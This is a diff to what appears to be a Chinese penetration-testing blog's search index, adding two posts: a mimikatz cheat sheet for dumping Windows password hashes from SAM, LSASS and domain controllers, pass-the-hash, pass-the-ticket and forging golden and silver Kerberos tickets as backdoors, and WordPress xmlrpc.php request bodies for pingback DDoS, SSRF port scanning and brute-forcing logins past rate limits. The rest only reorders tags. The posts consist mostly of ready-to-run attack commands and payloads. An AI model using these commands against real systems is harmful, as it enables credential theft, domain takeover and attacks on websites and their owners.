@@ -4,6 +4,48 @@
   
   
   <entry>
+    <title>mimikatz中哈希与票据操作</title>
+    <link href="/mimikatz%E4%B8%AD%E5%93%88%E5%B8%8C%E4%B8%8E%E7%A5%A8%E6%8D%AE%E6%93%8D%E4%BD%9C/"/>
+    <url>/mimikatz%E4%B8%AD%E5%93%88%E5%B8%8C%E4%B8%8E%E7%A5%A8%E6%8D%AE%E6%93%8D%E4%BD%9C/</url>
+    
+    <content type="html"><![CDATA[<p>记录一下获取哈希及票据相关的操作命令</p><a id="more"></a><h1 id="mimikatz中哈希与票据操作"><a href="#mimikatz中哈希与票据操作" class="headerlink" title="mimikatz中哈希与票据操作"></a>mimikatz中哈希与票据操作</h1><h2 id="00-导出SAM和System读取"><a href="#00-导出SAM和System读取" class="headerlink" title="00 导出SAM和System读取"></a>00 导出SAM和System读取</h2><p>SAM文件位置：C:\Windows\System32\config</p><p>导出文件：</p><pre><code class="hljs q">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive         <span class="hljs-comment">//导出SAM</span>ref <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive   <span class="hljs-comment">//导出system</span></code></pre><p>读取SAM和System获取hash：<br>pwdump7:</p><pre><code class="hljs xml">pwdump7.exe -s <span class="hljs-tag">&lt;<span class="hljs-name">samfile\</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">systemfile\</span>&gt;</span></code></pre><p>mimikatz:</p><pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:sam <span class="hljs-regexp">/sam:sam.hive /</span><span class="hljs-string">system:</span>system.hive <span class="hljs-comment">//使用mimikatz读取</span></code></pre><p>注意：<br>需要将sam.hive和system.hive放到本地mimikatz目录下</p><h2 id="01-读取本地SAM"><a href="#01-读取本地SAM" class="headerlink" title="01 读取本地SAM"></a>01 读取本地SAM</h2><pre><code class="hljs cpp">privilege::debug <span class="hljs-comment">//提升至debug权限</span>token::elevate   <span class="hljs-comment">//提升至system权限</span>lsadump::sam     <span class="hljs-comment">//读取SAM文件获取hash</span></code></pre><p>注意：<br>此方法需要在目标机器上运行mimikatz，需要考虑上传和免杀</p><h2 id="02-读取在线SAM"><a href="#02-读取在线SAM" class="headerlink" title="02 读取在线SAM"></a>02 读取在线SAM</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>注意：<br>要在mimikatz目录下打开命令行执行命令</p><h2 id="03-读取lsass-dmp"><a href="#03-读取lsass-dmp" class="headerlink" title="03 读取lsass.dmp"></a>03 读取lsass.dmp</h2><p>可以使用procdump导出lsass.dmp文件</p><pre><code class="hljs css"><span class="hljs-selector-tag">Procdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-acceptula</span> <span class="hljs-selector-tag">-ma</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.dmp</span></code></pre><p>使用mimikatz读取：</p><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp   <span class="hljs-comment">//加载dmp文件</span>sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span>  <span class="hljs-comment">//导出散列值</span></code></pre><h2 id="04-dcsync获取Hash"><a href="#04-dcsync获取Hash" class="headerlink" title="04 dcsync获取Hash"></a>04 dcsync获取Hash</h2><pre><code class="hljs groovy"><span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:要获取的domain /</span>all <span class="hljs-regexp">/csv   /</span>/导出域中所有用户名及hash<span class="hljs-string">lsadump:</span>:dcsync <span class="hljs-regexp">/domain:目标域 /</span><span class="hljs-string">user:</span>目标用户</code></pre><p>注意：<br>可以在域中任意一台计算机执行，但要使用域管权限打开命令行环境</p><h2 id="05-在域控中获取Hash"><a href="#05-在域控中获取Hash" class="headerlink" title="05 在域控中获取Hash"></a>05 在域控中获取Hash</h2><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span><span class="hljs-built_in">log</span>                      <span class="hljs-comment">//先生成一个文本文件记录，防止内容太多无法显示</span>lsadump::lsa /inject     <span class="hljs-comment">//导出域内所有账号和Hash</span></code></pre><h2 id="06-哈希传递"><a href="#06-哈希传递" class="headerlink" title="06 哈希传递"></a>06 哈希传递</h2><p>获取hash：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>注入hash：</p><pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span><span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">ntlm</span>:获取的hash    <span class="hljs-comment">//注入hash</span></code></pre><p>成功后自动弹出一个新的shell<br>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限</p><h2 id="07-密钥传递"><a href="#07-密钥传递" class="headerlink" title="07 密钥传递"></a>07 密钥传递</h2><p>获取aes256密钥：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::ekeys          <span class="hljs-comment">//获取密钥及其他用户信息</span></code></pre><p>传递密钥：</p><pre><code class="hljs less"><span class="hljs-attribute">privilege</span>::debug                                               <span class="hljs-comment">//提升至debug权限</span><span class="hljs-attribute">sekurlsa</span>::pth /<span class="hljs-attribute">user</span>:目标用户名 /<span class="hljs-attribute">domain</span>:目标域 /<span class="hljs-attribute">aes256</span>:获取的密钥   <span class="hljs-comment">//注入密钥</span></code></pre><p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>使用mimikatz进行哈希传递要具有本地管理员权限<br>aes128密钥也可以进行传递<br>目标机器需要安装KB2871997<br>如果安装了KB28711997，仍可以使用SID为500的用户进行哈希传递</p><h2 id="08-票据传递"><a href="#08-票据传递" class="headerlink" title="08 票据传递"></a>08 票据传递</h2><p>ptc方法：</p><pre><code class="hljs cpp">kerberos::purge         <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>kerberos::<span class="hljs-built_in">list</span>          <span class="hljs-comment">//查看当前机器凭证</span>kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span>klist                   <span class="hljs-comment">//查看是否注入成功</span></code></pre><p>ptt方法：</p><pre><code class="hljs cpp">privilege::debug           <span class="hljs-comment">//提升至debug权限</span>sekurlsa::tickets /exports <span class="hljs-comment">//将内存中的票据导出至当前目录</span>kerberos::purge            <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>kerberos::ptt <span class="hljs-string">"票据路径"</span>    <span class="hljs-comment">//将票据注入内存</span>klist                      <span class="hljs-comment">//查看是否注入成功</span></code></pre><p>注意：<br>dir命令后面要使用主机名，不能用IP，否则报错<br>票据注入内存默认有效时间10个小时<br>在目标机器上不需要本地管理员权限就可以进行票据传递</p><h2 id="09-黄金票据"><a href="#09-黄金票据" class="headerlink" title="09 黄金票据"></a>09 黄金票据</h2><p>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p><ul><li>需要的信息：</li><li>要伪造的域管理员用户名</li><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash<br>在域控中进行操作：<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>lsadump::lsa /patch      <span class="hljs-comment">// 专用于在域控制器上导出用户密码或hash</span></code></pre>在普通用户主机进行操作：<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/user:需要伪造的域管理员用户名 /</span><span class="hljs-string">domain:</span>demo.com <span class="hljs-regexp">/sid:域sid /</span><span class="hljs-string">krbtgt:</span> krbtgt用户的Hash <span class="hljs-regexp">/ticket:ticket.kirbi       /</span>/伪造凭证<span class="hljs-string">kerberos:</span>:ptt &lt;票据文件&gt;   <span class="hljs-comment">//注入</span><span class="hljs-string">kerberos:</span>:tgt             <span class="hljs-comment">//查看当前票据</span></code></pre>之后即可在普通用户主机上使用net use进行登录，伪造的黄金票据可以看做一个后门</li></ul><h2 id="10-白银票据"><a href="#10-白银票据" class="headerlink" title="10 白银票据"></a>10 白银票据</h2><p>白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC<br>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值<br>需要的信息：</p><ul><li><p>域名</p></li><li><p>域SID</p></li><li><p>目标服务器的FQDN</p></li><li><p>可利用的服务</p></li><li><p>服务账号的NTLM Hash</p></li><li><p>要伪造的用户名<br>在域控中的操作：</p><pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre><p>在普通用户主机的操作：</p><pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/domain:域名 /</span><span class="hljs-string">sid:</span>域SID值 <span class="hljs-regexp">/target:域控名 /</span><span class="hljs-string">rc4:</span>域控的NTLM hash <span class="hljs-regexp">/service:可利用的服务，如cifs /</span><span class="hljs-string">user:</span>要伪造的用户名，可任意填写 /ptt</code></pre><p>常用的服务名有以下:</p><pre><code class="hljs routeros">服务名称                    同时需要的服务WMI                        HOST、RPCSSPowerShell Remoting        HOST、HTTPWinRM                    HOST、HTTPScheduled Tasks            HOSTWindows File Share        CIFSLDAP                    LDAPWindows Remote<span class="hljs-built_in"> Server </span>   RPCSS、LDAP、CIFS</code></pre><p>黄金票据与白银票据的区别：</p></li><li><p>访问权限不同</p><ul><li>黄金票据:伪造TGT,可以获取任何Kerberos服务权限</li><li>白银票据:伪造TGS,只能访问指定的服务</li></ul></li><li><p>加密方式不同</p></li><li><p>黄金票据:由Kerberos的Hash—&gt; krbtgt加密</p></li><li><p>白银票据:由服务器端密码的Hash值—&gt; master key 加密</p></li><li><p>认证流程不同</p></li><li><p>黄金票据:利用过程需要访问域控(KDC)</p></li><li><p>白银票据:可以直接跳过 KDC 直接访问对应的服务器</p></li></ul><p>参考：</p><p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p><p>[<a href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/]</a>(<a href="https://www.k0rz3n.com/2019/03/17/浅析" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/17/浅析</a> Kerberos 认证过程以及黄金票据和白银票据/)</p><p><a href="https://www.freebuf.com/articles/network/245872.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/245872.html</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>内网渗透</tag>
+      
+      <tag>工具使用</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>wordpress中xmlrpc的利用</title>
+    <link href="/wordpress%E4%B8%ADxmlrpc%E7%9A%84%E5%88%A9%E7%94%A8/"/>
+    <url>/wordpress%E4%B8%ADxmlrpc%E7%9A%84%E5%88%A9%E7%94%A8/</url>
+    
+    <content type="html"><![CDATA[<p>利用WordPress的xmlrpc进行ddos、SSRF与暴力破解</p><a id="more"></a><h1 id="wordpress中xmlrpc的利用"><a href="#wordpress中xmlrpc的利用" class="headerlink" title="wordpress中xmlrpc的利用"></a>wordpress中xmlrpc的利用</h1><h2 id="00-利用pingback进行ddos攻击"><a href="#00-利用pingback进行ddos攻击" class="headerlink" title="00 利用pingback进行ddos攻击"></a>00 利用pingback进行ddos攻击</h2><p>pingback会自动向连接发送ping请求</p><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;      &lt;string&gt;目标网站&lt;&#x2F;string&gt;      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>需要注意的是出于测试目的需要在报头中加上</p><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/<span class="hljs-type">xml</span></code></pre><p>否则XML-RPC 服务会认为该请求不合法</p><p><strong>可以将目标网站设为dnslog，用于获取wordpress站点的真实IP</strong></p><h2 id="01-利用pingback进行SSRF"><a href="#01-利用pingback进行SSRF" class="headerlink" title="01 利用pingback进行SSRF"></a>01 利用pingback进行SSRF</h2><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;      &lt;string&gt;目标IP:端口&lt;&#x2F;string&gt;      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>根据返回包判断端口开放情况</p><h2 id="02-利用getUsersBlogs进行暴力破解"><a href="#02-利用getUsersBlogs进行暴力破解" class="headerlink" title="02 利用getUsersBlogs进行暴力破解"></a>02 利用getUsersBlogs进行暴力破解</h2><p>通常wordpress登录接口都是做了防暴力破解防护的，利用xmlrpc.php提供的接口尝试猜解用户的密码，可以绕过wordpress对暴力破解的限制</p><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p><pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;    &lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;    &lt;params&gt;    &lt;param&gt;&lt;value&gt;username&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;      &lt;param&gt;&lt;value&gt;password&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;    &lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;</code></pre><p>根据返回包判断爆破结果</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web安全</tag>
+      
+      <tag>WordPress</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>tomcat AJP文件包含漏洞与PUT写文件漏洞</title>
     <link href="/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
     <url>/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
@@ -81,9 +123,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>内网渗透</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -187,9 +229,9 @@
       
       <tag>Windows</tag>
       
-      <tag>权限提升</tag>
-      
       <tag>工具使用</tag>
+      
+      <tag>权限提升</tag>
       
     </tags>
     
@@ -216,9 +258,9 @@
       
       <tag>Windows</tag>
       
-      <tag>权限提升</tag>
-      
       <tag>工具使用</tag>
+      
+      <tag>权限提升</tag>
       
     </tags>
     
@@ -245,9 +287,9 @@
       
       <tag>Windows</tag>
       
-      <tag>权限提升</tag>
-      
       <tag>工具使用</tag>
+      
+      <tag>权限提升</tag>
       
     </tags>
     
@@ -272,9 +314,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -351,9 +393,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
       <tag>MSF</tag>
       
@@ -380,9 +422,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
       <tag>MSF</tag>
       
@@ -436,13 +478,13 @@
       
       <tag>Windows</tag>
       
-      <tag>权限提升</tag>
+      <tag>渗透测试</tag>
       
       <tag>工具使用</tag>
       
-      <tag>渗透测试</tag>
-      
       <tag>MSF</tag>
+      
+      <tag>权限提升</tag>
       
     </tags>
     
@@ -467,9 +509,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
       <tag>MSF</tag>
       
@@ -521,9 +563,9 @@
     
     <tags>
       
-      <tag>WEB安全</tag>
-      
       <tag>计算机网络</tag>
+      
+      <tag>WEB安全</tag>
       
     </tags>
     
@@ -548,9 +590,9 @@
     
     <tags>
       
-      <tag>WEB安全</tag>
-      
       <tag>计算机网络</tag>
+      
+      <tag>WEB安全</tag>
       
       <tag>DoS</tag>
       
@@ -791,9 +833,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
@@ -1264,9 +1306,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>工具使用</tag>
-      
       <tag>渗透测试</tag>
+      
+      <tag>工具使用</tag>
       
     </tags>
     
